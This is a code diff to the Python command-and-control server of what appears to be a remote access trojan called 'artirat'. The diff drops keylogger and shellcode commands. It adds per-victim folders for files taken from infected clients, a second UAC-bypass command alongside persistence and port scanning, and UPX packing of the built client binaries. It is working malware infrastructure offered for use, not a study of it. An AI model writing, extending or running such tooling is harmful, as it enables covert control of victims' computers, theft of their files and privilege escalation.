@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 import atexit
 import base64
-import glob as globmod
+
 import os
 import readline
 import socket
@@ -18,25 +18,7 @@ BUFFER_SIZE = 16384
 CONTROL_PORT = 19051
 SOCKS_PORT = 19050
 
-KEYLOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger")
-
-def save_keylog(cid: int, data_b64: str):
-    os.makedirs(KEYLOG_DIR, exist_ok=True)
-    path = os.path.join(KEYLOG_DIR, f"client_{cid}", "keylog.txt")
-    os.makedirs(os.path.dirname(path), exist_ok=True)
-    try:
-        decoded = base64.b64decode(data_b64).decode(errors="replace")
-        with open(path, "a") as f:
-            f.write(decoded)
-    except Exception:
-        pass
-
-def extract_keylog_lines(cid: int, text: str):
-    for line in text.split("\n"):
-        line = line.strip()
-        if line.startswith("[keylog] "):
-            save_keylog(cid, line[9:])
-
+CLIENTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clients")
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 PROJECT_DIR = os.path.dirname(BASE_DIR)
 CLIENT_CONFIG_DIR = os.path.join(".", "artirat-client", "config")
@@ -51,6 +33,8 @@ class ClientManager:
         self.clients: dict[int, tuple] = {}
         self.greeted: set[int] = set()
         self.next_id = 1
+        self.client_hostnames: dict[int, str] = {}
+        self.client_dirs: dict[int, str] = {}
 
     def add(self, conn, addr) -> int:
         with self.lock:
@@ -63,6 +47,8 @@ class ClientManager:
     def remove(self, cid):
         with self.lock:
             self.greeted.discard(cid)
+            self.client_hostnames.pop(cid, None)
+            self.client_dirs.pop(cid, None)
             return self.clients.pop(cid, None)
 
     def list_clients(self):
@@ -80,6 +66,20 @@ class ClientManager:
     def has_greeted(self, cid) -> bool:
         with self.lock:
             return cid in self.greeted
+
+    def set_hostname(self, cid: int, hostname: str):
+        with self.lock:
+            safe = "".join(c if c.isalnum() or c in "._-" else "_" for c in hostname)
+            if not safe:
+                safe = f"client_{cid}"
+            self.client_hostnames[cid] = safe
+            dirname = os.path.join(CLIENTS_DIR, f"client_{cid}_{safe}")
+            self.client_dirs[cid] = dirname
+            os.makedirs(dirname, exist_ok=True)
+
+    def get_client_dir(self, cid: int) -> str | None:
+        with self.lock:
+            return self.client_dirs.get(cid)
 
 
 def accept_clients(manager: ClientManager):
@@ -156,19 +156,17 @@ CLIENT_COMMANDS = [
     "screenshot",
     "upload",
     "download",
-    "shellcode",
     "uac",
+    "uac2",
     "persist",
     "check_elevated",
     "self_uac",
     "portscan",
-    "keylogger_start",
-    "keylogger_stop",
     "exit", "quit",
     "background",
 ]
 
-FILE_CMDS = {"download", "shellcode"}
+FILE_CMDS = {"download"}
 
 
 def _interactive_completer(text, state):
@@ -216,7 +214,8 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
         if initial is None:
             return _restore_completer("exit", old_completer, old_delims)
         init_text = initial.decode(errors="ignore")
-        extract_keylog_lines(cid, init_text)
+        hostname = init_text.split(">>")[0].strip()
+        manager.set_hostname(cid, hostname)
         print(init_text, end="", flush=True)
     while True:
         try:
@@ -274,15 +273,21 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
                 print("[Connection lost]")
                 return _restore_completer("exit", old_completer, old_delims)
             out = response.decode(errors="ignore")
-            extract_keylog_lines(cid, out)
             if out.endswith(prompt):
                 out = out[:-len(prompt)]
             out_clean = out.rstrip("\n")
             fname, fdata = parse_file_response(out_clean)
             if fname and fdata:
-                with open(fname, "wb") as f:
-                    f.write(fdata)
-                print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
+                client_dir = manager.get_client_dir(cid)
+                if client_dir:
+                    save_path = os.path.join(client_dir, fname)
+                    with open(save_path, "wb") as f:
+                        f.write(fdata)
+                    print(f"[Saved: {save_path} ({len(fdata)} bytes)]")
+                else:
+                    with open(fname, "wb") as f:
+                        f.write(fdata)
+                    print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
             print(out, end="", flush=True)
         except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
             print("\n[Connection lost]")
@@ -376,10 +381,14 @@ def multi_run(manager: ClientManager, cmdline: str, timeout=15):
             out = out[:-len(prompt)]
         fname, fdata = parse_file_response(out)
         if fname and fdata:
-            save = f"multi_{cid}_{fname}"
-            with open(save, "wb") as f:
+            client_dir = manager.get_client_dir(cid)
+            if client_dir:
+                save_path = os.path.join(client_dir, f"multi_{fname}")
+            else:
+                save_path = f"multi_{cid}_{fname}"
+            with open(save_path, "wb") as f:
                 f.write(fdata)
-            print(f"  [Saved: {save} ({len(fdata)} bytes)]")
+            print(f"  [Saved: {save_path} ({len(fdata)} bytes)]")
         print(out, end="")
 
 
@@ -394,21 +403,33 @@ EXE_BUILD_TARGETS = [
 
 
 def _stream_cargo(cmd, cwd, env, verbose=False):
-    if verbose:
+    process = None
+    try:
+        if verbose:
+            process = subprocess.Popen(
+                cmd, cwd=cwd, env=env,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1,
+            )
+            for line in process.stdout:
+                print(line, end="", flush=True)
+            process.wait()
+            return process.returncode
         process = subprocess.Popen(
             cmd, cwd=cwd, env=env,
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            text=True, bufsize=1,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
         )
-        for line in process.stdout:
-            print(line, end="", flush=True)
         process.wait()
         return process.returncode
-    r = subprocess.run(cmd, cwd=cwd, env=env, capture_output=True, text=True)
-    return r.returncode
+    except KeyboardInterrupt:
+        print("\n[!] Build aborted")
+        if process:
+            process.terminate()
+            process.wait()
+        return -1
 
 
-def build_client(target: str, verbose=False, static=False):
+def build_client(target: str, verbose=False, static=False, upx=False):
     targets = {
         "windows": "x86_64-pc-windows-gnu",
         "linux": "x86_64-unknown-linux-gnu",
@@ -470,6 +491,26 @@ def build_client(target: str, verbose=False, static=False):
             print(f"[-] objcopy failed: {e.stderr or e}")
     else:
         print(f"[+] Build succeeded for {t}")
+        if upx and not is_shellcode:
+            src_name = "artirat_client" + (".exe" if "windows" in target else "")
+            if is_dll:
+                src_name = "libartirat_client" + (".dll" if "windows" in target else ".so")
+            bin_path = os.path.join(".", "artirat-client", "target", t, "release", src_name)
+            if os.path.exists(bin_path):
+                orig_size = os.path.getsize(bin_path)
+                print(f"[*] Compressing with UPX... (original: {orig_size} bytes)")
+                result = subprocess.run(
+                    ["upx", "--force", bin_path],
+                    capture_output=True, text=True
+                )
+                if result.returncode == 0:
+                    new_size = os.path.getsize(bin_path)
+                    ratio = (1 - new_size / orig_size) * 100
+                    print(f"[+] UPX compression complete: {new_size} bytes ({ratio:.1f}% reduction)")
+                else:
+                    print(f"[-] UPX failed: {result.stderr.strip()}")
+            else:
+                print(f"[-] UPX: binary not found at {bin_path}")
     return True
 
 
@@ -578,22 +619,23 @@ def c2_menu(manager: ClientManager):
                 print(f"[Backgrounded session with client {cid}]")
         elif cmd == "build":
             if len(parts) < 2:
-                print("Usage: build <target> [--verbose] [--static]")
-                print("       build all [--verbose] [--static]")
+                print("Usage: build <target> [--verbose] [--static] [--upx]")
+                print("       build all [--verbose] [--static] [--upx]")
                 print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
                 continue
             verbose = "--verbose" in parts
             static = "--static" in parts
+            upx = "--upx" in parts
             target_arg = parts[1]
             if target_arg == "all":
                 targets = EXE_BUILD_TARGETS
                 for t in targets:
                     print(f"\n{'='*60}")
-                    build_client(t, verbose=verbose, static=static)
+                    build_client(t, verbose=verbose, static=static, upx=upx)
                 print(f"\n{'='*60}")
                 print("[+] All builds finished")
             else:
-                build_client(target_arg, verbose=verbose, static=static)
+                build_client(target_arg, verbose=verbose, static=static, upx=upx)
         elif cmd == "multi_run":
             if len(parts) < 2:
                 print("Usage: multi_run <command>")
